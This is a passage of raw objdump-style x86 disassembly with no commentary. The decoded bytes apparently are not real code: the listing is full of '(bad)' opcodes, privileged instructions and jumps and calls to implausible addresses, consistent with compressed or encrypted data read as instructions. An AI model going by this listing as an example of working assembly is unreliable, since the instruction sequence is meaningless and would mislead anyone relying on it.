  413e5e:	pop    ss
  413e5f:	cmp    edi,DWORD PTR [ebx+eiz*4+0x3c8cce9f]
  413e66:	es sub eax,0x76c47ee2
  413e6c:	or     al,0x40
  413e6e:	stos   DWORD PTR es:[edi],eax
  413e6f:	jmp    0x3eecd75e
  413e74:	inc    esp
  413e75:	and    DWORD PTR [ecx+0x16],edi
  413e78:	(bad)  
  413e79:	mov    esi,0x3feb29f7
  413e7e:	fnstcw WORD PTR [esi]
  413e80:	add    al,0xc2
  413e82:	aas    
  413e83:	inc    ecx
  413e84:	mov    ecx,0x7a7309d4
  413e89:	arpl   WORD PTR [esp+edi*4],sp
  413e8c:	mov    al,0x11
  413e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e8f:	xchg   esi,eax
  413e90:	push   ss
  413e91:	gs ss cld 
  413e94:	xchg   edi,eax
  413e95:	pop    edx
  413e96:	mov    BYTE PTR [esi],dh
  413e98:	pop    edi
  413e99:	rol    DWORD PTR [edx],1
  413e9b:	rol    ch,0x57
  413e9e:	outs   dx,BYTE PTR ds:[esi]
  413e9f:	mov    esp,0xf7fb4ea1
  413ea4:	jg     0x413e83
  413ea6:	sar    DWORD PTR [eax],0xe9
  413ea9:	bound  eax,QWORD PTR [eax-0x29]
  413eac:	jmp    0x86cc5683
  413eb1:	push   cs
  413eb2:	mov    ebp,0xbb579742
  413eb7:	xor    DWORD PTR [edx],esi
  413eb9:	out    dx,eax
  413eba:	sub    DWORD PTR [ebp+eax*4-0x66],esi
  413ebe:	inc    ebp
  413ebf:	scas   eax,DWORD PTR es:[edi]
  413ec0:	popf   
  413ec1:	adc    DWORD PTR [ecx],edx
  413ec3:	or     al,0x6
  413ec5:	test   BYTE PTR [eax],cl
  413ec7:	retf   
  413ec8:	rol    DWORD PTR [ebp+0x61],1
  413ecb:	and    ecx,DWORD PTR [edx+edi*8-0x35]
  413ecf:	mov    ecx,0xa8cafeda
  413ed4:	cmp    BYTE PTR [eax-0x33],bl
  413ed7:	lock or ebp,DWORD PTR [ecx-0x9]
  413edb:	sar    ebp,1
  413edd:	neg    BYTE PTR [eax-0x56d94d73]
  413ee3:	xchg   edx,eax
  413ee4:	push   ds
  413ee5:	stc    
  413ee6:	dec    eax
  413ee7:	pop    es
  413ee8:	int3   
  413ee9:	repz scas eax,DWORD PTR es:[edi]
  413eeb:	mov    WORD PTR [eax-0x76],gs
  413eee:	aad    0x7c
  413ef0:	push   ebp
  413ef1:	popf   
  413ef2:	sbb    al,0xa8
  413ef4:	cmp    DWORD PTR [edx],0xa73334bf
  413efa:	in     al,0xd4
  413efc:	push   esi
  413efd:	jle    0x413ea9
  413eff:	(bad)  [edx+0x71ef3b55]
  413f05:	xor    ecx,DWORD PTR [ecx+edx*2]
  413f08:	pop    esp
  413f09:	and    eax,0xb29a0c48
  413f0e:	dec    esi
  413f0f:	pop    esp
  413f10:	(bad)  
  413f11:	mov    ds:0x1e368358,eax
  413f16:	mov    bh,0x70
  413f18:	mov    edx,0x5097d6b8
  413f1d:	bound  eax,QWORD PTR [edi+0x5]
  413f20:	xchg   ebp,eax
  413f21:	xchg   BYTE PTR [eax],ah
  413f23:	push   di
  413f25:	repz inc esp
  413f27:	and    BYTE PTR [ebx+0x580266cf],ch
  413f2d:	cmc    
  413f2e:	xor    al,0xb2
  413f30:	dec    esi
  413f31:	nop
  413f32:	fnstcw WORD PTR [esi]
  413f34:	les    ebp,FWORD PTR [edx+esi*4]
  413f37:	xchg   esi,eax
  413f38:	ret    
  413f39:	pop    esp
  413f3a:	lahf   
  413f3b:	je     0x413ee0
  413f3d:	jle    0x413fb5
  413f3f:	fcom   DWORD PTR [edi-0x75]
  413f42:	inc    esp
  413f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f44:	jns    0x413ee5
  413f46:	add    eax,0x1138e000
  413f4b:	push   ds
  413f4c:	dec    esi
  413f4d:	ror    BYTE PTR [esi],0xdb
  413f50:	dec    esi
  413f51:	push   edx
  413f52:	cmp    BYTE PTR ds:0x2e32922a,dl
  413f58:	mov    ah,0x9f
  413f5a:	sub    ecx,esi
  413f5c:	push   eax
  413f5d:	sub    bh,ch
  413f5f:	dec    ebp
  413f60:	sahf   
  413f61:	cli    
  413f62:	sub    BYTE PTR [edx],0xb1
  413f65:	add    ebx,esp
  413f67:	mov    ds:0x72dacdb,eax
  413f6c:	test   edi,ebp
  413f6e:	push   esi
  413f6f:	cli    
  413f70:	mov    ch,0x76
  413f72:	hlt    
  413f73:	daa    
  413f74:	scas   eax,DWORD PTR es:[edi]
  413f75:	push   es
  413f76:	sub    DWORD PTR [esi+esi*4+0x5b71e36e],edi
  413f7d:	xor    WORD PTR [esi+edx*1-0x57],0xac5f
  413f84:	mov    ecx,0x71516aee
  413f89:	pop    eax
  413f8a:	lahf   
  413f8b:	xchg   DWORD PTR [eax],edx
  413f8d:	stos   BYTE PTR es:[edi],al
  413f8e:	out    0xbd,eax
  413f90:	pop    esp
  413f91:	mov    eax,ds:0x5e4cf7f
  413f96:	mov    dl,0x14
  413f98:	mov    al,0x9e
  413f9a:	or     BYTE PTR [edi],al
  413f9c:	das    
  413f9d:	xor    al,0x2a
  413f9f:	lock out 0xb8,al
  413fa2:	fsub   DWORD PTR [edx+0x22]
  413fa5:	jl     0x413fd8
  413fa7:	(bad)  
  413fa8:	fcomi  st,st(1)
  413faa:	lds    ebx,FWORD PTR [edx+0x27ca6410]
  413fb0:	sub    eax,0x4154f100
  413fb5:	neg    BYTE PTR [eax+0x36]
  413fb8:	and    ebx,DWORD PTR [ecx-0x4a1c3992]
  413fbe:	push   esi
  413fbf:	push   esi
  413fc0:	push   ebx
  413fc1:	(bad)
  413fc4:	pop    ss
  413fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc6:	add    al,0x41
  413fc8:	sbb    esp,DWORD PTR [ecx+0x59]
  413fcb:	icebp  
  413fcc:	sub    ebx,DWORD PTR [ebp-0x8]
  413fcf:	sub    al,0xeb
  413fd1:	and    edx,esp
  413fd3:	jno    0x413f81
  413fd5:	push   0x73
  413fd7:	sbb    eax,0xa1b5354
  413fdc:	fsubr  QWORD PTR [ebx+0x7f]
  413fdf:	or     ah,bh
  413fe1:	leave  
  413fe2:	(bad)  [esi+eax*2+0x4d]
  413fe6:	inc    ebx
  413fe7:	cmp    esp,DWORD PTR [edx+0x2c]
  413fea:	cli    
  413feb:	call   0x45b4168f
  413ff0:	push   es
  413ff1:	int    0xcd
  413ff3:	pop    es
  413ff4:	dec    BYTE PTR [ebx-0x5e93e563]
  413ffa:	ficomp DWORD PTR [edx-0x46]
  413ffd:	mov    dl,0xbd
  413fff:	jp     0x414064
  414001:	mov    WORD PTR [ecx-0x5883169d],cs
  414007:	and    edx,ebx
  414009:	bound  esp,QWORD PTR [edi+ebx*8+0x11]
  41400d:	xor    BYTE PTR [ebx+0x2e],bl
  414010:	scas   al,BYTE PTR es:[edi]
  414011:	pop    ecx
  414012:	mov    eax,0x6f4face0
  414017:	stc    
  414018:	jecxz  0x41408c
  41401a:	push   ebp
  41401b:	retf   0x1620
  41401e:	push   edi
  41401f:	pusha  
  414020:	rcl    edx,0x25
  414023:	push   edx
  414024:	mov    ebp,0xaa9a1be6
  414029:	mov    cl,0x7f
  41402b:	pop    ebx
  41402c:	add    edi,ebp
  41402e:	inc    ebp
  41402f:	(bad)  
  414030:	jnp    0x41409a
  414032:	call   0x67f6:0x7ae62724
  414039:	fimul  WORD PTR [edx]
  41403b:	or     DWORD PTR [edx+esi*4-0x44d615e1],esi
  414042:	pop    di
  414044:	popf   
  414045:	or     esp,DWORD PTR ds:0x7e8c4ae8
  41404b:	jne    0x414045
  41404d:	dec    esi
  41404e:	mul    BYTE PTR [edi]
  414050:	adc    al,0x2f
  414052:	loope  0x41402b
  414054:	out    dx,al
  414055:	loop   0x413fe8
  414057:	(bad)  
  414058:	cmc    
  414059:	lock dec eax
  41405b:	fwait
  41405c:	xchg   esi,eax
  41405d:	jmp    0xa6e19bff
  414062:	push   0x55
  414064:	xor    DWORD PTR [edx],esi
  414066:	repz mul BYTE PTR [ecx]
  414069:	in     eax,dx
  41406a:	mov    bh,0x3a
  41406c:	je     0x413ffe
  41406e:	jb     0x414048
  414070:	popa   
  414071:	xlat   BYTE PTR ds:[ebx]
  414072:	fwait
  414073:	stos   DWORD PTR es:[edi],eax
  414074:	or     bl,BYTE PTR ds:0x7058c878
  41407a:	in     eax,dx
  41407b:	mov    ds:0xa5c4c529,al
  414080:	popa   
  414081:	push   0x665bb8a3
  414086:	dec    edi
  414087:	push   0x3372a328
  41408c:	sbb    BYTE PTR [edx],al
  41408e:	loop   0x41410e
  414090:	addr16 lahf 
  414092:	mov    edi,DWORD PTR [edx]
  414094:	aas    
  414095:	sub    eax,0xcd6291c8
  41409a:	mov    WORD PTR [ebx+0xe],fs
  41409d:	inc    edi
  41409e:	dec    esi
  41409f:	adc    eax,0x25a02d27
  4140a4:	icebp  
  4140a5:	pop    esp
  4140a6:	gs mov bh,0x76
  4140aa:	jno    0x4140e1
  4140ac:	stos   DWORD PTR es:[edi],eax
  4140ad:	cld    
  4140ae:	xor    BYTE PTR [ebx+0x6e],0x88
  4140b2:	sahf   
  4140b3:	inc    ebx
  4140b4:	test   al,0x9e
  4140b6:	push   ebp
  4140b7:	mov    al,0x3e
  4140b9:	out    0xdd,al
  4140bb:	rcr    dh,0xf0
  4140be:	mov    ds:0xf002db3a,eax
  4140c3:	jnp    0x4140d3
  4140c5:	(bad)  
  4140c6:	mov    BYTE PTR [eax],dh
  4140c8:	or     dh,al
  4140ca:	pop    edi
  4140cb:	in     al,0xbc
  4140cd:	or     edx,edi
  4140cf:	add    DWORD PTR [ebx-0x5c],ebx
  4140d2:	cld    
  4140d3:	pop    edi
  4140d4:	fimul  DWORD PTR [edx+0x7c772004]
  4140da:	cmp    ebp,ecx
  4140dc:	jns    0x4140a7
  4140de:	sub    bh,dh
  4140e0:	fs mov ah,0x2a
  4140e3:	test   eax,0xed9638bc
  4140e8:	int3   
  4140e9:	rcl    BYTE PTR ds:0x7ace83ff,cl
  4140ef:	mov    ch,0x49
  4140f1:	push   ecx
  4140f2:	scas   eax,DWORD PTR es:[edi]
  4140f3:	xor    BYTE PTR [edx],ch
  4140f5:	push   0x3c7311f7
  4140fa:	sbb    DWORD PTR [bx+di],edi
  4140fd:	pop    ss
  4140fe:	(bad)  
  4140ff:	ja     0x414161
  414101:	or     ebx,esp
  414103:	pushf  
  414104:	outs   dx,DWORD PTR ds:[esi]
  414105:	jecxz  0x4140b4
  414107:	aas    
  414108:	call   0x459b7f6
  41410d:	and    eax,0x16f5caed
  414112:	int    0x48
  414114:	retf   
  414115:	retf   
  414116:	adc    al,0x90
  414118:	inc    ecx
  414119:	test   eax,0x9c9c212a
  41411e:	pop    ss
  41411f:	fs iret 
  414121:	dec    ebp
  414122:	into   
  414123:	out    0x2d,al
  414125:	(bad)  
  414126:	(bad)  
  414127:	sbb    eax,0x5015ffee
  41412c:	pop    edi
  41412d:	iret   
  41412e:	xchg   ebx,eax
  41412f:	mov    dh,0x99
  414131:	stos   DWORD PTR es:[edi],eax
  414132:	ds pop esp
  414134:	cmp    DWORD PTR [edx+0x4c2757a6],eax
  41413a:	xchg   ebx,eax
  41413b:	(bad)  
  41413c:	stos   BYTE PTR es:[edi],al
  41413d:	jbe    0x414155
  41413f:	dec    edx
  414140:	mov    ecx,0x89b88b01
  414145:	and    ebx,esp
  414147:	dec    ebp
  414148:	push   es
  414149:	and    BYTE PTR [eax],bh
  41414b:	lods   al,BYTE PTR ds:[esi]
  41414c:	sbb    al,BYTE PTR [ecx]
  41414e:	sub    ecx,DWORD PTR [ebp+0x2d244158]
  414154:	icebp  
  414155:	add    BYTE PTR [ecx+0x20],bh
  414158:	jns    0x4141b8
  41415a:	and    DWORD PTR [esi+ebx*8],edi
  41415d:	ins    BYTE PTR es:[edi],dx
  41415e:	test   eax,0x75243160
  414163:	repnz stc 
  414165:	scas   eax,DWORD PTR es:[edi]
  414166:	in     al,dx
  414167:	popf   
  414168:	cmc    
  414169:	inc    edx
  41416a:	rcr    esi,cl
  41416c:	lods   al,BYTE PTR ds:[esi]
  41416d:	jmp    0x414181
  41416f:	push   ss
  414170:	jns    0x41419f
  414172:	sbb    eax,0xb1d9142e
  414177:	sbb    eax,0x18d8a80f
  41417c:	sub    eax,0x69a863c5
  414181:	rol    bl,cl
  414183:	xor    eax,edx
  414185:	mov    ah,0x54
  414187:	cwde   
  414188:	retf   
  414189:	or     al,0xb7
  41418b:	mov    al,ds:0x3675bc31
  414190:	and    ebp,ecx
  414192:	jnp    0x414141
  414194:	cmp    BYTE PTR [esi+0x76],bh
  414197:	mov    ebp,0x91d723d
  41419c:	std    
  41419d:	xor    al,0x6f
  41419f:	mov    ebp,0x5c0381e5
  4141a4:	mov    edi,0x42c7b3c7
  4141a9:	scas   eax,DWORD PTR es:[edi]
  4141aa:	fs in  al,dx
  4141ac:	dec    esp
  4141ad:	daa    
  4141ae:	aad    0xd3
  4141b0:	adc    al,0xf
  4141b2:	xor    BYTE PTR ds:0xfa3659d6,al
  4141b8:	inc    ebx
  4141b9:	xor    ebp,ecx
  4141bb:	test   al,0xc0
  4141bd:	shl    DWORD PTR [ebp+0x2f],1
  4141c0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4141c2:	dec    esp
  4141c3:	mov    al,ds:0xa877848c
  4141c8:	sbb    eax,0xd00b90c2
  4141cd:	and    edx,DWORD PTR [edi+0x48ec1d7a]
  4141d3:	mov    ss,ebp
  4141d5:	fild   QWORD PTR [edi+0x416bb6c1]
  4141db:	out    0x4d,al
  4141dd:	std    
  4141de:	dec    edi
  4141df:	aad    0xc8
  4141e1:	push   0x698c217f
  4141e6:	stos   DWORD PTR es:[edi],eax
  4141e7:	jle    0x41421d
  4141e9:	arpl   WORD PTR [ebp+0x40d64694],bp
  4141ef:	cli    
  4141f0:	mov    es,WORD PTR [edx]
  4141f2:	(bad)  
  4141f3:	jmp    0x75a5:0x24c93164
  4141fa:	xchg   ebx,eax
  4141fb:	les    ebx,FWORD PTR [ecx]
  4141fd:	rol    ecx,1
  4141ff:	aas    
  414200:	pop    es
  414201:	cmp    esp,DWORD PTR [esi+0x20cd337b]
  414207:	sub    ebp,ebx
  414209:	fstp   TBYTE PTR [edi]
  41420b:	xchg   ebp,eax
  41420c:	ins    BYTE PTR es:[edi],dx
  41420d:	jmp    0x9d6a:0xfafa0816
  414214:	or     DWORD PTR cs:[ecx+0x5f],ecx
  414218:	iret   
  414219:	sbb    DWORD PTR [ecx-0x47ae484d],0x30
  414220:	retf   
  414221:	and    al,0xd1
  414223:	call   0x4c35:0xb5c763d7
  41422a:	and    al,0xa6
  41422c:	js     0x414268
  41422e:	aaa    
  41422f:	test   al,0x53
  414231:	mov    cl,BYTE PTR [ebx+ebx*4+0x7149a74b]
  414238:	dec    esp
  414239:	sbb    eax,0x21732fff
  41423e:	pop    esp
  41423f:	int    0x3b
  414241:	sub    al,0xe5
  414243:	mov    al,ds:0xa0b89961
  414248:	jecxz  0x414268
  41424a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41424b:	mov    edx,0x562835d6
  414250:	ss xor dl,ah
  414253:	cmp    BYTE PTR [eax-0x70],dl
  414256:	pop    ds
  414257:	pusha  
  414258:	hlt    
  414259:	or     ecx,DWORD PTR [edi-0x127eacde]
  41425f:	faddp  st(4),st
  414261:	mov    BYTE PTR [ebx],al
  414263:	or     bl,BYTE PTR [edi]
  414265:	adc    edi,DWORD PTR [edx+0x25]
  414268:	xor    BYTE PTR [esi-0x665253d8],bh
  41426e:	sbb    eax,0x7412feea
  414273:	mov    ebx,0xa4e06bdc
  414278:	sbb    esi,edi
  41427a:	or     ecx,DWORD PTR [edi-0x59b41353]
  414280:	jns    0x4142af
  414282:	loope  0x41426c
  414284:	mov    edx,0xb46bd8ac
  414289:	ja     0x4142f9
  41428b:	sahf   
  41428c:	dec    ebx
  41428d:	jmp    0x41422c
  41428f:	fnstenv [ebx]
  414291:	mov    cl,0xac
  414293:	and    DWORD PTR [esi],ebp
  414295:	cs sti 
  414297:	fisttp QWORD PTR [ebp-0x10]
  41429a:	call   0x44605ce9
  41429f:	or     DWORD PTR [eax-0x4a],edx
  4142a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a3:	test   al,0x20
  4142a5:	push   0xffffff96
  4142a7:	pop    eax
  4142a8:	sub    BYTE PTR ds:0x6f4a7de4,bh
  4142ae:	dec    eax
  4142af:	inc    edx
  4142b0:	mov    ah,0xd6
  4142b2:	int3   
  4142b3:	adc    BYTE PTR [ebp+ebx*1+0x30],bh
  4142b7:	(bad)  
  4142b8:	mov    fs,WORD PTR [esi-0x34]
  4142bb:	push   0xfffffffe
  4142bd:	or     BYTE PTR [edi+0x2638b504],al
  4142c3:	and    cl,BYTE PTR [ebx-0x72]
  4142c6:	sbb    eax,0xad54201a
  4142cb:	xor    dh,0x94
  4142ce:	sbb    al,0x1d
  4142d0:	dec    eax
  4142d1:	push   es
  4142d2:	outs   dx,DWORD PTR ds:[esi]
  4142d3:	sbb    eax,DWORD PTR [esi]
  4142d5:	mov    ds:0xf6b64114,al
  4142da:	les    edx,FWORD PTR [esi+0x2e322133]
  4142e0:	xchg   edi,eax
  4142e1:	jno    0x414341
  4142e3:	outs   dx,BYTE PTR ds:[esi]
  4142e4:	jbe    0x4142b2
  4142e6:	push   edi
  4142e7:	push   edx
  4142e8:	pop    ecx
  4142e9:	cmp    BYTE PTR ds:0x54fe40ac,ch
  4142ef:	aad    0x58
  4142f1:	push   eax
  4142f2:	xor    ebx,DWORD PTR [ebx-0x1d050bf4]
  4142f8:	mov    ecx,0x5fe71e29
  4142fd:	ret    0x71d5
  414300:	lock ins BYTE PTR es:[edi],dx
  414302:	jl     0x4142d6
  414304:	fsub   QWORD PTR [edx+0x2]
  414307:	add    BYTE PTR [edx],dh
  414309:	mov    edx,0xc3a77341
  41430e:	cdq    
  41430f:	not    edi
  414311:	les    edx,FWORD PTR [edi]
  414313:	(bad)  
  414314:	call   0x3038728c
  414319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41431a:	mov    ebx,0x7b96a98f
  41431f:	bound  ebx,QWORD PTR [esi+edi*8+0x41434a6f]
  414326:	pop    ds
  414327:	fsubr  QWORD PTR [ebx*4-0x1f8f0a7e]
  41432e:	mov    bl,0xb9
  414330:	into   
  414331:	ins    BYTE PTR es:[edi],dx
  414332:	cmp    dl,BYTE PTR [ebx-0x55261568]
  414338:	out    0x5b,al
  41433a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41433b:	push   es
  41433c:	pop    ss
  41433d:	dec    esp
  41433e:	ret    
  41433f:	sbb    cl,BYTE PTR [ecx]
  414341:	daa    
  414342:	shr    edx,1
  414344:	push   esp
  414345:	nop
  414346:	test   al,0x5
  414348:	mov    edi,0xb81a239d
  41434d:	xchg   edi,eax
  41434e:	gs gs (bad) 
  414351:	mov    ebx,0xff1d7f8b
  414356:	or     ah,dh
  414358:	pop    esp
  414359:	loopne 0x4143d7
  41435b:	(bad)  
  41435c:	sbb    BYTE PTR [edi-0x48137ed9],al
  414362:	int    0x7a
  414364:	cmp    eax,0x3eb95174
  414369:	push   ss
  41436a:	sub    DWORD PTR ds:0xdbb01ce,eax
  414370:	adc    al,bl
  414372:	pop    esi
  414373:	cmp    ch,BYTE PTR [edi-0x1972d54]
  414379:	je     0x4143cb
  41437b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437c:	xchg   DWORD PTR [edx+edi*4-0x1dd79a24],ebx
  414383:	or     eax,0xda2052bf
  414388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414389:	call   0x28c7303e
  41438e:	(bad)  
  414390:	(bad)  
  414391:	in     al,0x6
  414393:	jmp    0xc1434e19
  414398:	mov    bh,0x3b
  41439a:	pop    eax
  41439b:	mov    esi,0xa98cc760
  4143a0:	or     esi,0xa5ff6089
  4143a6:	outs   dx,DWORD PTR ds:[esi]
  4143a7:	xor    BYTE PTR [edx],ah
  4143a9:	fsub   QWORD PTR ds:0x4a1fc2ce
  4143af:	enter  0x4b9b,0x2c
  4143b3:	lds    edi,FWORD PTR [edi+0x52]
  4143b6:	sub    dl,ah
  4143b8:	push   eax
  4143b9:	dec    ebx
  4143ba:	(bad)  
  4143bb:	neg    BYTE PTR [esi-0x1ca069e9]
  4143c1:	in     al,0x78
  4143c3:	scas   al,BYTE PTR es:[edi]
  4143c4:	pop    ebx
  4143c5:	scas   al,BYTE PTR es:[edi]
  4143c6:	shr    cl,0x54
  4143c9:	xchg   DWORD PTR [ecx+0x18],esi
  4143cc:	jge    0x4143a0
  4143ce:	cmp    dh,BYTE PTR [ebx+0x78c44ed1]
  4143d4:	call   0xe10ffa50
  4143d9:	jne    0x41437c
  4143db:	fstp   DWORD PTR [eax-0x76bd3dbf]
  4143e1:	cmp    ah,bl
  4143e3:	pop    es
  4143e4:	arpl   WORD PTR [edi-0x1765f995],bx
  4143ea:	adc    dh,dh
  4143ec:	xor    al,0x5c
  4143ee:	retf   0xc0d1
  4143f1:	outs   dx,BYTE PTR ds:[esi]
  4143f2:	mov    cl,0xb
  4143f4:	adc    al,0xe2
  4143f6:	sub    BYTE PTR [ecx+0x6b40e899],cl
  4143fc:	fcomi  st,st(0)
  4143fe:	cmp    ebx,edx
  414400:	call   0xc6e7:0x2992e9ee
  414407:	adc    DWORD PTR [esi+0x38],esi
  41440a:	inc    ebx
  41440b:	call   0x9edd:0xbf4619fb
  414412:	mov    edi,esp
  414414:	xchg   esi,eax
  414415:	aam    0x6
  414417:	bound  ecx,QWORD PTR [ebp-0x48b0cbd9]
  41441d:	jmp    0x47d6b078
  414422:	cli    
  414423:	int    0xb5
  414425:	adc    ebx,0xc26abfa3
  41442b:	push   ds
  41442c:	push   edx
  41442d:	push   0x7
  41442f:	pop    es
  414430:	hlt    
  414431:	and    al,0x61
  414433:	sbb    al,0x31
  414435:	jb     0x414423
  414437:	int3   
  414438:	fdiv   DWORD PTR [ebx]
  41443a:	push   ss
  41443b:	mov    bl,0x7e
  41443d:	fwait
  41443e:	hlt    
  41443f:	fld    QWORD PTR [ecx-0x26]
  414442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414444:	jnp    0x41445c
  414446:	sbb    edi,esp
  414448:	jg     0x41441c
  41444a:	inc    esi
  41444b:	mov    ah,0xdd
  41444d:	and    al,0x22
  41444f:	sbb    BYTE PTR [eax],ah
  414451:	dec    edx
  414452:	jmp    0x8c88:0x19a8f499
  414459:	dec    esi
  41445a:	inc    ebp
  41445b:	or     dh,bl
  41445d:	push   ss
  41445e:	pop    edi
  41445f:	scas   eax,DWORD PTR es:[edi]
  414460:	cs adc eax,0xe7261d94
  414466:	xchg   BYTE PTR [esi+eax*4+0x24],bh
  41446a:	out    dx,al
  41446b:	add    eax,0x483576a8
  414470:	inc    edx
  414471:	push   edx
  414472:	mov    WORD PTR [edi+0x6],gs
  414475:	xchg   ebx,eax
  414476:	ins    DWORD PTR es:[edi],dx
  414477:	dec    ebp
  414478:	not    BYTE PTR [ebp-0x4]
  41447b:	pop    ebp
  41447c:	and    ah,BYTE PTR [esi+0x7]
  41447f:	(bad)  
  414481:	rol    edi,1
  414483:	call   0x560f:0xa4815fe0
  41448a:	mov    edi,0xb6dc0310
  41448f:	ficom  WORD PTR ds:[esi]
  414492:	jle    0x414440
  414494:	popa   
  414495:	pop    ss
  414496:	cdq    
  414497:	cld    
  414498:	aas    
  414499:	shr    DWORD PTR [ecx],cl
  41449b:	or     ecx,DWORD PTR [edx+0x38]
  41449e:	add    eax,0x1dbdf3d3
  4144a3:	jle    0x4144cb
  4144a5:	adc    BYTE PTR [ebp+0x1c31ee08],bh
  4144ab:	mov    cs,WORD PTR [esi+edi*1+0x2d]
  4144af:	pop    ebp
  4144b0:	xchg   ebx,eax
  4144b1:	(bad)  
  4144b2:	enter  0x75da,0xe6
  4144b6:	int3   
  4144b7:	mov    dl,0x5b
  4144b9:	push   0x57
  4144bb:	scas   eax,DWORD PTR es:[edi]
  4144bc:	push   ss
  4144bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144be:	(bad)  
  4144bf:	scas   al,BYTE PTR es:[edi]
  4144c0:	xchg   ebx,eax
  4144c1:	repz xor al,0x27
  4144c4:	cmp    BYTE PTR [edx],ch
  4144c6:	mov    BYTE PTR [ecx+edx*4+0x1a],ch
  4144ca:	mov    bh,0x31
  4144cc:	scas   eax,DWORD PTR es:[edi]
  4144cd:	arpl   bp,sp
  4144cf:	(bad)  
  4144d0:	clc    
  4144d1:	loopne 0x41447d
  4144d3:	rcr    DWORD PTR [edi+0x55],1
  4144d6:	adc    esi,DWORD PTR [eax+0x5991c3a4]
  4144dc:	sahf   
  4144dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144de:	xor    BYTE PTR [esi-0x80],0xe0
  4144e2:	loopne 0x414488
  4144e4:	retf   
  4144e5:	(bad)  
  4144e7:	fidivr DWORD PTR [edx]
  4144e9:	in     eax,0x77
  4144eb:	mov    edi,0x321332b6
  4144f0:	jo     0x4144c0
  4144f2:	pop    ebp
  4144f3:	dec    eax
  4144f4:	or     BYTE PTR [edx-0x23a5fd09],dl
  4144fa:	pmulhuw mm7,QWORD PTR [eax]
  4144fd:	data16 mov ?,WORD PTR [esi-0x1f7bc299]
  414504:	leave  
  414505:	das    
  414506:	gs lock out 0x6e,al
  41450a:	lahf   
  41450b:	sbb    BYTE PTR [ebx+ebx*1],dh
  41450e:	xor    esp,ebp
  414510:	ins    BYTE PTR es:[edi],dx
  414511:	mov    ebp,0xcaf34891
  414516:	sar    BYTE PTR [edi-0x190f6411],1
  41451c:	sbb    BYTE PTR [ebx+0x906bf3f],cl
  414522:	lods   eax,DWORD PTR ss:[esi]
  414524:	call   0x3c5c041e
  414529:	and    BYTE PTR [eax+ebx*1-0x21],bl
  41452d:	dec    edx
  41452e:	lock add al,0x1f
  414531:	cmc    
  414532:	xchg   bh,dh
  414534:	pushf  
  414535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414536:	jp     0x41455b
  414538:	fwait
  414539:	inc    eax
  41453a:	popf   
  41453b:	cmc    
  41453c:	int3   
  41453d:	xchg   ebp,eax
  41453e:	xchg   edx,eax
  41453f:	adc    al,0xd7
  414541:	inc    esp
  414542:	fsubrp st(6),st
  414544:	fsub   QWORD PTR [ebp+0x7d]
  414547:	aam    0x63
  414549:	sbb    BYTE PTR [edi+0x6a82cfa6],cl
  41454f:	outs   dx,BYTE PTR ds:[esi]
  414550:	xchg   ebp,eax
  414551:	push   ss
  414552:	add    eax,0xec6c1cb9
  414557:	repz lock loop 0x4144e1
  41455b:	test   eax,0x2f6c9402
  414560:	int3   
  414561:	data16 jg 0x414589
  414564:	(bad)  
  414565:	dec    ecx
  414566:	adc    eax,0x1ff8c405
  41456b:	cdq    
  41456c:	and    ch,cl
  41456e:	or     DWORD PTR [eax-0x5c325f23],eax
  414574:	call   0xa196:0x23998842
  41457b:	push   edi
  41457c:	pop    edi
  41457d:	and    al,0x83
  41457f:	xchg   ebx,eax
  414580:	mov    DWORD PTR [ebx],ebp
  414582:	push   0x2a
  414584:	fadd   QWORD PTR [ebp+0x20]
  414587:	jae    0x4145a7
  414589:	jmp    0x4145cb
  41458b:	jae    0x41456c
  41458d:	and    al,0xdb
  41458f:	push   esp
  414590:	xchg   edi,eax
  414591:	lock test ah,ch
  414594:	cs push ebp
  414596:	out    0x8e,al
  414598:	xor    DWORD PTR [edx],ecx
  41459a:	hlt    
  41459b:	mov    ah,0xf2
  41459d:	ficom  DWORD PTR [edx+0xaa66d9c]
  4145a3:	icebp  
  4145a4:	add    DWORD PTR [edi-0x2e],eax
  4145a7:	ret    0xc15d
  4145aa:	xchg   ebx,eax
  4145ab:	jp     0x414600
  4145ad:	jne    0x41453c
  4145af:	js     0x4145bc
  4145b1:	add    BYTE PTR [ecx],cl
  4145b3:	jecxz  0x4145f3
  4145b5:	test   al,bl
  4145b7:	adc    al,0xb0
  4145b9:	sub    DWORD PTR [ecx+0x37],0x51
  4145bd:	and    esi,DWORD PTR [esp+esi*1-0x3]
  4145c1:	mov    eax,?
  4145c3:	mov    bh,0x73
  4145c5:	mov    bl,BYTE PTR [eax]
  4145c7:	mov    ecx,0x85b6221c
  4145cc:	push   edx
  4145cd:	and    ch,BYTE PTR [eax+0x59072964]
  4145d3:	pop    edx
  4145d4:	jb     0x414605
  4145d6:	jno    0x4145cd
  4145d8:	test   al,0x76
  4145da:	fadd   st,st(7)
  4145dc:	sbb    al,dh
  4145de:	pop    ebx
  4145df:	mov    ch,BYTE PTR [ecx+0x37]
  4145e2:	fcmove st,st(3)
  4145e4:	ins    DWORD PTR es:[edi],dx
  4145e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e6:	iret   
  4145e7:	xor    eax,DWORD PTR [ecx+0x10]
  4145ea:	ret    
  4145eb:	into   
  4145ec:	xor    DWORD PTR ds:[eax+edi*1-0x65dedecb],0xd8b81554
  4145f8:	test   BYTE PTR [ebx-0x62],cl
  4145fb:	sub    al,0xa7
  4145fd:	retf   0xadc3
  414600:	jge    0x414667
  414602:	fdiv   QWORD PTR [ecx]
  414604:	xor    DWORD PTR [eax+0x71a3672b],ebp
  41460a:	outs   dx,BYTE PTR ds:[esi]
  41460b:	adc    ebp,edi
  41460d:	fs ja  0x41465d
